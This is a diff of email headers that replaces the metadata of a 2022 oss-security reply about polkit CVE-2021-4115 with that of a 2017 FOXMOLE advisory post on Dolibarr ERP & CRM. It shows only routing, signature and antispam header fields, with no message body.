@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1154" "Friday" "18" "February" "2022" "11:19:27" "-0800" "Alan Coopersmith" "alan.coopersmith@oracle.com" nil "26" "Re: [oss-security] CVE-2021-4115: polkit: file descriptor leak allows an unprivileged user to cause a crash." nil nil nil "2" nil nil (number mark "U       alan.coopers Feb 18   26/1154  " thread-indent "\"Re: [oss-security] CVE-2021-4115: polkit: file descriptor leak allows an unprivileged user to cause a crash.\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2021-4115: polkit: file descriptor leak allows an unprivileged user to cause a crash." nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6261" "Wednesday" "10" "May" "2017" "10:28:29" "+0200" "FOXMOLE Advisories" "advisories@foxmole.com" "<24585059-6758-7cd1-f142-8c56a1a9ffb8@foxmole.com>" "177" "[oss-security] Dolibarr ERP & CRM - Multiple Issues" nil nil nil "5" "2017051008:28:29" "[oss-security] Dolibarr ERP & CRM - Multiple Issues" (number mark "U       advisories@f May 10  177/6261  " thread-indent "\"[oss-security] Dolibarr ERP & CRM - Multiple Issues\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 19832 invoked by uid 550); 18 Feb 2022 19:19:48 -0000
+Received: (qmail 16125 invoked by uid 550); 10 May 2017 13:35:57 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,145 +12,257 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 19814 invoked from network); 18 Feb 2022 19:19:47 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=message-id : date :
- subject : to : cc : references : from : in-reply-to : content-type :
- content-transfer-encoding : mime-version; s=corp-2021-07-09;
- bh=G7jhHcwLEt035Cg+A4EtZNtZG7hlncT2tMooEOeH5ks=;
- b=GHEUD995rvLHLmjV4NfderIKimmzYieaZx5cNXKrxrf35fpp/QZSNuiMG8/cxZXAJCH6
- iq6kH4R/x8WsOGmd9D8CEN9Uyxr43Q3D8x8TZswwXlNc81SsA2Nwvyj2OEvYl4Yn240S
- Y64WjziobldsINY+Elis02rChmOZ31IWcznRarGbjEIgBgubpL7w+4lzKQ0UmNWAk+uO
- zd3GLxwazTXWulK/3CcPOyTzFD+fYBdd3LnPBVDS5RWUBnJ+QMa4YySjgjRYwX+eZTeR
- Gc67Ypc2sGdCuiHFNgKFhOD3bxyH8bKwAJs63pHVKZdXvHoZ+04ELGFEQZ9lbpQ/gesW 0A== 
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=n+mjweXMgk1hmZuU+kWCDvQE4kKDoG5w+h4V7v5vzUDLcVGO1L+k00WZIgaiO1Uu7L5ypH62XfN4qsjqKnJl4/WWKhui6wFlg3X5rIjlSflmL08/EByo1Zi4ePr+aLNqFnfIpIrEOBnJc2Jh8A75mRVNcbgA0eV5FkjmmRmzk6SU54/4f54p3Ry7z/9D0s1kdCjjwA/Kx1AWbQjIERvWe1ERKtjWnfqKl1gVWJ6NOZ9ci4/vOOshsL7SbIeJyQMgXdhdZLDTu+ootlO+bLDPJyESPFAHXn/XcVCYSqC+O9VO9N6XBP73WrT9eMV6DiTQ2KsKbWMdhm9RXJxwdPTixw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=G7jhHcwLEt035Cg+A4EtZNtZG7hlncT2tMooEOeH5ks=;
- b=ORO/Ic967IpghWmtVgELYLpTg1bwvfAJL50dN5lLP04fULRGkR5Yf9BsN7PGTO/UeRNYwUXRyjTbKwyxMnEtH2uQriF9zjnGqvdfjji+U8jH6W+GG1jiD5K9Ck+IyulR9aY3LKaOf4atd8M2pxefN1qLE6XK0T6nSd2VJu7qN4RKXqRsXhYvcT/ynK6sLlZWRH1WE0QY55dSkGs8F0JD7fFQSJxW4UM9MGcbU+ZPGNO6DQ2Etn9rmb2DOa7IA50OVF8zu8We+jmCxz/bmntFdeSgaQxl45puggBTn748n9LnfOlZBNJ6UA5UQi4ejSeR6ayKfMvw2eq7xm01H4Zo/A==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
- dkim=pass header.d=oracle.com; arc=none
+Received: (qmail 20114 invoked from network); 10 May 2017 08:28:45 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=G7jhHcwLEt035Cg+A4EtZNtZG7hlncT2tMooEOeH5ks=;
- b=K0elglIBAbqFFI2MoyrBQbPOGZpOgW/QuiRH6h85GV5Zb+7hJPHjF/L/wAAAKEycefSF5XGRm/f7nS/yaEitPu5jGY21sE8t7TM5Jtq/9GMW+/hYDFWjlGOmLWW8HT++H7piawjZZM+Nvb49ECGRuP8ypbfUNCXaWSFjwrAaRUg=
-Message-ID: <aaadb779-50ab-2204-7927-bb8f93fd6b46@oracle.com>
-Date: Fri, 18 Feb 2022 11:19:27 -0800
-User-Agent: Mozilla/5.0 (X11; SunOS i86pc; rv:91.0) Gecko/20100101
- Thunderbird/91.4.0
-Content-Language: en-US
-To: oss-security@lists.openwall.com, Devon Thompson <devthomp@redhat.com>
-Cc: jrybar@redhat.com, gsuckevi@redhat.com
-References: <d4660f03-ed92-97e1-98b3-dee46248bea6@redhat.com>
- <cb935607-d53a-5043-ddae-54c200e6734b@redhat.com>
-From: Alan Coopersmith <alan.coopersmith@oracle.com>
-In-Reply-To: <cb935607-d53a-5043-ddae-54c200e6734b@redhat.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-X-ClientProxiedBy: SA0PR11CA0040.namprd11.prod.outlook.com
- (2603:10b6:806:d0::15) To PH0PR10MB5730.namprd10.prod.outlook.com
- (2603:10b6:510:148::19)
+ d=Keyldentity.onmicrosoft.com; s=selector1-foxmole-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version;
+ bh=0XlNNkJak+i5g3jBOqBGH/veNInTCA1bXtLilTbM3zY=;
+ b=CeVvjCfjEAuoOfmj6IysMjjPEYTePQuWBAifHFOPOAJ9kTOWaKMdfCY8+12oeQd29J33mxD+Udyg+fxy3dE01at+TE7gwZ6DrVsBQMZ1BJId9ZwlVrWR325Iy00fwPwh7URt7pulK3k+ZqFjl7/JD4Fn6z2FCpRAumVeXZ0znFw=
+Authentication-Results: lists.openwall.com; dkim=none (message not signed)
+ header.d=none;lists.openwall.com; dmarc=none action=none
+ header.from=foxmole.com;
+From: FOXMOLE Advisories <advisories@foxmole.com>
+To: <oss-security@lists.openwall.com>
+Message-ID: <24585059-6758-7cd1-f142-8c56a1a9ffb8@foxmole.com>
+Date: Wed, 10 May 2017 10:28:29 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.8.0
 MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature";
+	boundary="uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC"
+X-Originating-IP: [31.24.175.118]
+X-ClientProxiedBy: DB5PR08CA0050.eurprd08.prod.outlook.com (10.166.166.146) To
+ HE1P193MB0057.EURP193.PROD.OUTLOOK.COM (10.171.125.16)
 X-MS-PublicTrafficType: Email
-X-MS-Office365-Filtering-Correlation-Id: 8de469c1-ce38-4c2a-71ba-08d9f31396d3
-X-MS-TrafficTypeDiagnostic: BN8PR10MB4098:EE_
-X-Microsoft-Antispam-PRVS: 
-	<BN8PR10MB409808E924406482CC6EF28CE0379@BN8PR10MB4098.namprd10.prod.outlook.com>
-X-MS-Oob-TLC-OOBClassifiers: OLM:1468;
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam: BCL:0;
-X-Microsoft-Antispam-Message-Info: 
-	tcCVFKr3jHFQA7irus7caOv/TNtxy9OBHQZkhmCDKoTLYoaNDtDkXttr7E/Zjd7ape3UpTOwLTsBuNndLMBUmKpj9nCm8P/SMDMoVLrYGPjH4NMkGJyi65y31xb8fFBas9BJrSqvOWZb2Sn0cM2NAE0Vf6QytYSV4yyFbeM8PFpm3iTrVWWi2iqdt6caath+QqBggzJNDEM6ySDE4kv+y89Joxv1Fl54lAMF3cQYjEiIcEVzT19wn0Iexqf8UeUqYXAfd9pyg+T0N3bPgBw8fUP7CNP+ZpU5Dow2GLycBUrnd6WRZ5TgYAaiGMW3nNrT4npvaBqesfewE1zhE14JkGQZWCW8X/OPeU3RcbiYirXj8MZiY77xc1ivhGcPt3AXPJZLmU+mTbg5OAtU+N8PMHEtJIHEj8t7sXEaXRZPDAL0kAr1Na1rai+X6uq4k/fFvCCiHVVbGOrX/97gpj9fqsqW0S+cimDI6qTRpU4sbFTKCHZz1OpqqfA8+JR5vasBxBs+v/QAxwcrmxE81LkjVpYOXaLchV85Tz4Eup3XCsbfoPKoSWqWWCHN4jMj2OfO48x0HbLbpbIL9IIeMU+AyboWQ5G9nsekOTxHbTzS+tTR1EE/Mx5Hkqbf1HozRFHc2GxQfeFXIKXqQ0MAO4Cn78JwLD5DYUVoByOjIKQKzsBLbJstyJFzsmyJcVd2jFcldUOjevQcSKil85eZnrE97pe2dNYoAEF+WQobH0q7uCqwxMksr/fg+dY5UZnN+dY2jqd4MTH6cdyII0jk0J03Gyl7J7G/TZW8+2nz4im2Xc4ZnTWqZ+Ufzz4Q45MGvwmdWV5Ky2FwvCdh2+tu0RDfZFyjghnCQ3mFAM6OxpxfBb8=
-X-Forefront-Antispam-Report: 
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:PH0PR10MB5730.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230001)(366004)(6486002)(38100700002)(966005)(2906002)(508600001)(6916009)(44832011)(2616005)(6506007)(86362001)(316002)(66476007)(66556008)(6666004)(66946007)(31696002)(8676002)(4326008)(8936002)(53546011)(6512007)(5660300002)(83380400001)(186003)(26005)(36756003)(31686004)(15650500001)(45980500001)(43740500002);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0: 
-	=?utf-8?B?V3g5VUZBaVRRSlhtdzhJWFAxRXE5WkM2Q0pEMkhndy9Ld1hoelgwQVdHYmJI?=
- =?utf-8?B?SlJyUDdDUkJ3amdiMGpVUmxhUHBiSnBLcWpsejBPUDF2SHJTZUlGbUtqUXVl?=
- =?utf-8?B?YkdrVndXMy9MMGRmaVJUbHd2b3J2WnluRlI4WDNmZ3p2QXNqWVBBMis3RCsy?=
- =?utf-8?B?V1FMTVk0NWJMN0VHc29zWTdVSlYwQ3JxUmxodTZGOWJITEFHZDdLaXVHbmds?=
- =?utf-8?B?WUJVOS9GYURkYk9nQTRLZjBpUnRmS2tXQkIzNmRucGxhTnN4eWY3cllkWmpu?=
- =?utf-8?B?TkRONmcwOHdHVCtpbG9aZUhYU0ZsNTFKb0lGNDRMVWFRYlo4MndsN3VTVUxL?=
- =?utf-8?B?U0JjMDFKRnllNytCb01mWHpGT1hnSytNTEJyUTJIZU16QkFreDdjYWVXZWw4?=
- =?utf-8?B?cVNwcE1OTVhiUHI2VGpBQ21DOWlqUDZnVnpxRDVTaTBrbVZxVHlOUEZEZk9N?=
- =?utf-8?B?bTB5VEd4cU1SQTdnd01mNENtUTI0L1lTUER0WWdFeTZOdzkwYVdVcmROUkwx?=
- =?utf-8?B?bWlPQk9NOFdBU2lQbWgyWkV2ZXBLNmY5S01iMktwMkFWRUtSYVFWaXloVmJz?=
- =?utf-8?B?bDYxd3dzUlhjNjhkMmRvbkpvTjlkT2NoOVFiRi9XeEJHODJOUm8xLy8vUDhq?=
- =?utf-8?B?L01iUXR1cVlQQlBZSnFDK2VhbnpEOFpETjAwY096RHBUQnU2ZmFwcmJONENk?=
- =?utf-8?B?ak5MQzRFM1JvemRRS2xIRDhNaHVTWWhwRlVvbnFYWVVtQzFWTVRzUXM1NDZE?=
- =?utf-8?B?aTdQY0hxYjR1T3JxWWhmWDNxdC9mT1Nia3hMQVNQcEh3ci82UnFvSmg1a0lk?=
- =?utf-8?B?K1p2KzkxUXo0ZzFsRkY1ZFhzdWZCK1U4a2F0NUYzV3hXdU1oWTBXakovb2xa?=
- =?utf-8?B?REhLS0tCcDNmak1sVjRvS2ZoV005V0cyMVArRGpsL0llUUJKNzRxdy9Hd3NG?=
- =?utf-8?B?RHhZckhzeHJZZUpWZHJzRGZQK0pud0llcmtyd1ViWC9Obkk0bXh3Um95am9S?=
- =?utf-8?B?M0g0NTZHczBTOVh5MGlKeE5vVGRnVVpLRG9pWm5IMk1xMnNPZ2FSRVZ4eW51?=
- =?utf-8?B?UDIxLzV3Wjl0NUhReDNGcHVrd2J5OUxTSk8vdUovSkVWNWRmWG8rMm5VK29M?=
- =?utf-8?B?K0pzWkg2a3JGbkF4azBpZ1JHbEFRTmZ2YWcyb1MxNXpyR1F5UXlnMFhPQkdV?=
- =?utf-8?B?Y1NXN3ByV1FLdm9tYmIvZVR1bHp5dWkydWtrZmZ1ODRvZW5ZZ1lFQXE5MEdm?=
- =?utf-8?B?bk9EQy92TER4VDluRWx0bjZ0WlMzSHI3UlNLbmgvejhxYkgwaGdpOE5lcXgr?=
- =?utf-8?B?UkI1RzdFOVk2TmR1MExxcmc2KzJjeFJIdHhFM0N0alQ3TGJUTjg2dEZCZXJ3?=
- =?utf-8?B?b0lzMGtJZG5uTHRxNzVlT1hJRDgyWGt6T3dnK2hRaU5kY0ZKRzJKRTlBb3cr?=
- =?utf-8?B?dlY0L1hDU000RmpvNmZIOFhHeHdXTlROUGoraTgrcUlvOGlUK3crTHVyT3VG?=
- =?utf-8?B?dkpDRC9DMlhZZGtDNFkyYjBmWCt6UW41ZDNidVR1Y2R5NFFzQ1lldkFLLzhO?=
- =?utf-8?B?TU5BVTlDMkZ2SzBoRjJYQyt6NzNtQjFPekdhR0tPc0tNNzBXRUNidWYxZmZ3?=
- =?utf-8?B?K1BtOXY0RUlqNE4zZU12eFFpd0hsTStvdkJZSWJ2QXFGTVhmZE9sSTRpM0VE?=
- =?utf-8?B?RHZvVk1ia1l2YStDSGNFWEppNmhHbmNkQ3lOamJZTnUydjYxbXJKZWxVZGJE?=
- =?utf-8?B?cGdmQ0Z0WXJFc2dZeEVNcUlJSGg5VllJcnp1MjRtd3o5V0wyNHZQNHpXTjRy?=
- =?utf-8?B?NWtDUWk4aXRtMnNkYTVDWDBidGtNVlF6TFpsT2JCN0FUTElibnZ6OGpxVVA2?=
- =?utf-8?B?NHZKYlhIUGpGMmFhUmdDV1lSd3p3MXA3V1lSSVNwUXViM1Fxc2cwdHRCMkNL?=
- =?utf-8?B?Y0lBTHR0Um1QaW5uSmZBeXJrNnZBeUsxb3JiMzNSR0lpSThJcjkwTW93alpT?=
- =?utf-8?B?aW1idWUvWWl3N2txWkc0bEEvdXdPcVUvZjMzWWdaTEFPTVh0M1hLVzN1Q0dW?=
- =?utf-8?B?aW16ZG9XdElFNHRQbEhad2dMU3ZZSUpWdjNRZElsVXc3MGxpak5HYXBML2dC?=
- =?utf-8?B?T0JmdW9rN2N2N2Y4UkoxSG1CaThDNDgxTGVZdnhQem13QUp2MXBpdXh0TC9T?=
- =?utf-8?B?NVBrd3FPM0htdElLbURlUmdBbzRUT1RqYlhrc256bmJUZjQ0YW56VG5pYzFJ?=
- =?utf-8?B?OVAxNDU5RkVTYVNBOENoQit6am5BPT0=?=
-X-OriginatorOrg: oracle.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 8de469c1-ce38-4c2a-71ba-08d9f31396d3
-X-MS-Exchange-CrossTenant-AuthSource: PH0PR10MB5730.namprd10.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 18 Feb 2022 19:19:31.2567
- (UTC)
+X-MS-Office365-Filtering-Correlation-Id: 39990b31-322d-4f2e-62d0-08d4977e8b96
+X-Microsoft-Antispam:
+	UriScan:;BCL:0;PCL:0;RULEID:(22001)(201703131423075);SRVR:HE1P193MB0057;
+X-Microsoft-Exchange-Diagnostics:
+	1;HE1P193MB0057;3:i4N7sK/Te4ET0khLvBRVVwE69lPvHoVZJxQh6FQRxHsH11FS92UqWa+yEb0Dxt8RH8wXyQgvMrgJMR4Uk/0S76fFLrbcDORc3Y9CR1TFmkbp6OOKZ+VLMj03uMv4EmS+NhDxurpe2ZSOxEeTQ408B0703Jc5pq9RTgY0VC5tlthg2EIbk/StAbzEZie9iZK76BKl1aKTYjvgK5jFSxXzQjY9b7ssU7O8mqKgcSADW7/3ZeSC3DfnnbEsf7AokODSjRoE2c/0nWEFj01qlpZaSn5jrdrjObsRqOfhFSNJjos=;25:MxNxhc5IvxDQm1FyaJ7Rw3/1n6lGlkOhz4sH7my0gr8AiRI2AvFDPfZQmekGFl5d9rTUzncxISr1jQAceEXjoX448ffIAdiqSDQRyMVoZyMPiqxkDfbVEEJGqDmYIsS79a79TZ/iTP8yfsZ9NUbHdNWFq6Ox5FvMZFG2jvDWtgMwu1XWIC1EJ/4pAjmNvrLOLEYlwmrx+yAUwn6AK44amCZHZxJU6qBIGhvQZpZVONm7/5wmCBKxNDFamrxxgYKEUN0UnsByVocAWZwXbBGZ7N8lEMMgi/kUEgKdCPEJcGsrwpFsSs/jX7W9daeR7OqrQQzJbO3BkHmAIdFIxoCL9gCIGmSPfwaJKcNMf6VfE67/tqJhWPEQ1fdcHxuRyE7mtsHSCu+nHV68RJc35LNrEnyTPT2jG1S7+x82+AvzEYV5rSNkyXpcJIMskdTQk9rTGCsoOyDg5pR0GTbDW6bXVbeiB4a4ha8fsDwYpPtCWCk=
+X-Microsoft-Exchange-Diagnostics:
+	1;HE1P193MB0057;31:wzmcw2AKbSLnKAiCQ9kXe1NsjgHEWHAkcGiPHxi/0tM63Wm10ihr/VIxiqlREkIEi6NIUT3rUClYMOH9ssA3YVYk3Y5pV6wvMjVg2YBogNCYBhUx1gase0BHZn78lKE6UfAIu0Js3gDFiSWt0yTlmKEA+Iky5qA7TiTIkHMFSpwP/2X74A1PS5AL4EXzGUaMIA4YEl4iKiN6ZW7DnQk9zD8RKpFdC6tIhjnfjcqzVdy5EGAQ7fW1nH1+ZFR1PRYGExx5a1EF4nbgFY5Q7F1dmg==;20:ghARU5zSXl8wEMW49Us/O2S4jp9zvwrPJQGjeJsPuN4Z+Pq4A3lVx/nZpWd+aQ6qp4O9qTiSvPUhTnFdfGynmcrdBcjjbF92Eon3m4czMAK1UhIJ3i5zsxhMRoQ5bIsap4fT5uyoTvr/yYlXLI4QQNjIBhRnqXH/yLpa0HekO+OtS+ubbu4EUHeGJNcFUpzwkg5wGFO4d3x8hOb0l9F5JKtaLq0nUmj7nJspwVTF0udyS/xJfXeivTMty/Z5OCqv9BF5gJ0T49HpTCyaMGDYOwKr+HuuYtC2yuRxj7XeoRBl/3a/yYiU7cSAgyGgaLfYH57PhVcN01cPc9QiFZIO+ziVPNAJzW4ZGXcM+ti8SJQVcq02EHJnKUJAfV9ts1OeCbD2XIx6Phk/kD1bPOmtsCwVd5ywfnikSqboCJSzpTPpkW/6tM44hli3QKkesJkxuJsvZ0rD+mUjhjPrXcA9ooDXwMIGXX7zzashIyWcscsWRWNcWWJ4rVFZaYuSSJCo
+X-Microsoft-Antispam-PRVS:
+	<HE1P193MB005795E96692A2997E80670FC4EC0@HE1P193MB0057.EURP193.PROD.OUTLOOK.COM>
+X-Exchange-Antispam-Report-Test: UriScan:(76373721406558)(192374486261705);
+X-Exchange-Antispam-Report-CFA-Test:
+	BCL:0;PCL:0;RULEID:(6040450)(2401047)(8121501046)(5005006)(10201501046)(3002001)(93006095)(93001095)(6041248)(20161123558100)(201703131423075)(201702281528075)(201703061421075)(201703061406153)(2016111802025)(20161123555025)(20161123560025)(20161123564025)(20161123562025)(6043046)(6072148);SRVR:HE1P193MB0057;BCL:0;PCL:0;RULEID:;SRVR:HE1P193MB0057;
+X-Microsoft-Exchange-Diagnostics:
+	1;HE1P193MB0057;4:xV3mnHdfoRq9BrBeDvihit5S+udjE0h2/WJqaZH46ZE2ROuA3WgTXfkaFpv+47t4ZVu6L2TN7PvMx7zas1MDi7RXDZykOWBiMu5Om7Cc31c7C4BWyTRvop7wmCP5LOGHzq/1joVn9rTaR30WPMkTV9pJJdccd962Y2HD65LeyVfSai7p6tOuC95xxhDR1uvqmJ6OFl53ky54e92SYPf8Jnpb876uas0P1rUXUeO6Wep9gFVgNqDdJaJDEC4AV8Atnsyd/VSDPUVSq+QJPL1iLkbSn9CsR42qgH66FptIAn2PXJtOTopmM1Czyjgyc3Yuy33d9ogWqPwxo8dZvL0Nk2ZiVpv2MM+LIlGjugjGwBskDQpesIjhbqd3uG8fF2UR9YLDyjhdmYZ9gB22ivz/t7ZChcUUTXVxMTSEGr38ChNJOa6T+VzXtPhr2laHH0IWnInMLxbk6ELvBeWz6vo+6/FmGnzaJI3Gz8KYTNM0pd5b00gIChIdd8S1RgUbUpES0L4K6aDz7QkjAsBjBYVgkudSfymotIjAmoT2HPiw51PfbqcX4cpCzv08ACuZyE21PtiejSobqdGoJrgsOBbozSk/gv4d8cGYiwR5FxpDh11HAEhQJdOKraH4b+Aix9spBmwf6U7v6zPHUR5hxJymUAztBUIWVwgkuLUunc/tC/uMKf8Q/A76D+inITN8OFMhi+4cP5EsZ1K4WHeU6myuMeO8nqcJWRFUosqglxCvMwJq1LTZDmvs7pa8+oz/j7Ine+IL2qKsRDeo2rkZUtLHPRXn6Kv9vJNWXSZFwIcccQIjR5/r4BCdU0Z5LtCLuQgn5EoA5fQ0nGbyGfW4IjS2asqo0h2kwIEa30VBi5liVAdboFaa+ysujykIYuxAFO8wdC1wCrU54l6qpA5b16EQyA==
+X-Forefront-PRVS: 03030B9493
+X-Forefront-Antispam-Report:
+	SFV:NSPM;SFS:(10019020)(4630300001)(6009001)(6019001)(6049001)(39840400002)(39410400002)(39450400003)(39400400002)(269900001)(377424004)(81166006)(50986999)(54356999)(2906002)(7736002)(305945005)(42186005)(551544002)(2351001)(8676002)(36756003)(31686004)(38730400002)(512874002)(5890100001)(86362001)(575784001)(25786009)(84326002)(65826007)(110136004)(31696002)(83506001)(5660300001)(478600001)(966004)(53936002)(16799955002)(189998001)(64126003)(6306002)(6666003)(6486002)(77096006)(6916009)(6116002)(3846002)(568964002)(66066001)(4001350100001)(15188155005)(65956001)(33646002)(21480400002)(10721665003);DIR:OUT;SFP:1102;SCL:1;SRVR:HE1P193MB0057;H:[10.78.115.101];FPR:;SPF:None;MLV:sfv;LANG:en;
+X-Microsoft-Exchange-Diagnostics:
+	=?us-ascii?Q?1;HE1P193MB0057;23:qxkHRnYvrarE+0YT4CU52ln6c+FMST4G1HhWrnkWk?=
+ =?us-ascii?Q?4fxzWQlh9ewGTfGpVbBfNqmxa3tzS9/+4aKY7xK6fbj32KNDc/qzcCoYoZ1e?=
+ =?us-ascii?Q?CDDRFgBkUXA0qMxCBES5XhxRLQftalR71/Bdc9jKmzJf+GXUiupnr34vvYHz?=
+ =?us-ascii?Q?LkeFGW6GSrcrjxheUuMcvO/+UU0Ab7sy1PurVDRJ02qqSlBODWiksJXMRn7D?=
+ =?us-ascii?Q?RkCvm6h0bdMDVmw2LJkIyzrjeeUvOhszrv/fZphbDGBJdpdx9sO9UVpKy710?=
+ =?us-ascii?Q?0pLG6D7la2xNbP/8stkNBAbih4qkqyy59m4DaRV3Lf0vM09p1K7FrbgYQRWh?=
+ =?us-ascii?Q?yY9NIzlYYXWg/fWStrInMDOjK9BUyBf1A5c8NXpfl5JQuACF1jHz44lrLNSn?=
+ =?us-ascii?Q?aZJ8D4rpjrFJT3BcdcFMMi/tErxI1Kmu0Lpay8NZspMu56jvO0zsTYV68lzX?=
+ =?us-ascii?Q?CBsZ/zSbhjn49DfJGWagM7xmCg0YPcFE3IruTjqQ8MAcb/y/4TKNTWk0wl+2?=
+ =?us-ascii?Q?adXYCeKyxTWztNMZPYYvRAvtFn1IfH5PwcFOQL9LvUZIZ4iK8uKDWeLgjS79?=
+ =?us-ascii?Q?EzsIUwEua40b7s+chdZW+N1Oa9gKU//S+uSIpP7SMu1lJ7I4VzxZY/WXrf18?=
+ =?us-ascii?Q?O4aLbU/HFNPU4BEHYXOwUQzNjQXVBL37p0CyagLqCyT2RjyP9WAXfrb/iWXh?=
+ =?us-ascii?Q?zQQ04g/ZGUwaxNT6gt9L/jEdtaIycMx5GZnjmmhpC9h5MQ68QTon/RR1Y+1v?=
+ =?us-ascii?Q?yxQA5BnZ9c/p6d49aX61apxwxeKSjlIUQtZkLZ3FmNMtYWQC5l1ymU1C1uib?=
+ =?us-ascii?Q?2kk3GnfvR1gNCZW2HqHOXdk4N63tNED0PZ0RlZRL6Ff6iNfjnvlhinCbpL8P?=
+ =?us-ascii?Q?f1y/US3Y5yndnEVkxGXqbb/n1WFOyNm292UUTsfLKn5iBRXHnLfauYrlm02Q?=
+ =?us-ascii?Q?qJCDCHXridFVi7aLLGZk9iZJI1a26XqOSKxCJYmJQp0CWfdp4JSdq+yc2DWV?=
+ =?us-ascii?Q?wQum8++1TRoYMUHlK6WoJaqcOZKutnMjAionEbKY0bhGgigJx9maMRWqrhI/?=
+ =?us-ascii?Q?0OBMLqcYCsizcsFGuwHXS6TLZVoLzyMht8XFjLoerTiOXFzgmUQRo5sFgLOA?=
+ =?us-ascii?Q?oSsbZ3frCWm78Pwyq+4KoZ84SUBsK3xOumuGBOTg66g6uDtCrLsHRI/YT0tO?=
+ =?us-ascii?Q?ZVvJAGLw2QvP4He/Nj22VSDu1frVDfCLD28xKol6fQYjmwvOPuLQ/trphH6n?=
+ =?us-ascii?Q?BGb1JSfSf7FLCRBcAceTOB8R3Xjek/RBklhxTQeo/XCRjkfrY+ATRuybxPak?=
+ =?us-ascii?Q?VHXWEFoSsQFaXoRbmChij+QVtqDuV7ZcQjurZeeOuKyXLTuApaKMo3bT6aPd?=
+ =?us-ascii?Q?y1QGVt+zrPGlzCkLeTd1qyJxf0=3D?=
+X-Microsoft-Exchange-Diagnostics:
+	1;HE1P193MB0057;6:pHcrEIhbaRhBNwD9+HuLqzxaYocRMXoUwGcY9RYO2hX+CIhHF9pflyIYgUehxv2t+88aj/+OSmOftBQnGgx089DrHtOl07mc+XBOjf+1o05ncd+smgLK51wrsNEphlTTQBHfEK1MD23WbByRLqk9zackPRVkTdwzA9sLi/sSwv6yilEr0HY0U7aWIp/w2y2Zc4kw1MTv6K09Y8BW8/MQZ89GyyUmx5jtcLqCn/2MC5d/+SBh1w38yvg24YkErvwn2JOcf9GnfojFZ0u1sEl5qoK8x9SmshYfkmO2Q3g9rZ/q7XXdKja5MtBaZJKYh+EsjfTypuU24+Zpg38Khmrg1xnMcIrfZHM8j01khHP6Qxb0sC5gZhkAPoMqG+e3HM5KL4RM/Cpux4/qDkbhsb4akXFRKAI7NnsV/Mgx/7Og2Ea+yzGurHm9MEugSez7hRhro1vAhhNV4NAeRHPB5JwUD9VtVjRPmru3/O7sZgcia1cCgUITqjQ3NNNlR+ZUs2EFh3HFNHETssW9vbHM5pzpv/eKZIVwMuMWo8xsDpHb2ZP/b6f0bDJ1gckbF4zGl2NI;5:tMbeN/0pvh3HOHxX9ps+psPFKNJBMu4/zY5m1mu7raW1lcGdUFziPm2kCrvaL+NvzK2j/dXs+2C+iLGkPDNCGKb/5nw84hxNAUKlBpXYRngUhnA+W8pTTd6excpHS3fRnV6YT9GDNGvL69DXyu3I4w==;24:zEkeCtu8ax+bUI8nCWhSHE9N3WV5bYcc0GVEPSUb+3Nm++xZgNHiAQeERNcm4Ot1lt4BWTIzYATSmZdamBJgMth2YoPIkhZ01oxSaOQSBEU=
+SpamDiagnosticOutput: 1:99
+SpamDiagnosticMetadata: NSPM
+X-Microsoft-Exchange-Diagnostics:
+	1;HE1P193MB0057;7:gTMaMHTRi3TSYUWXdQGNsvKiT7agCDfsoJ4C/Gg32uQNaaTIXvtvKG1DAW4tM9xRcVzaVbMa7g5QSu79/YQ896ZSzFP3zfGo5ZG8gGEXqn4q0cebbhQ5dkacSeVpTbLJkFlc42MSFPtlYofJC1RVNPVbaepLq+KolWWXE/H+ewC0FINCPChrDpZW6EJPzOdJGFLbrkfEPHf8wMczUCeWtwn3qXeZJy8IDLWHL5sYM1zxkTYJq1tvp3gpeUQKmbV6aVGwE0Rlpez7vDDtow6ECt7K9s2PI3/jZdCHdqJpEoZ/4T5B5MNWLt9lLryfV1RGjR95FSEa96zq9djZj4NpqA==
+X-OriginatorOrg: foxmole.com
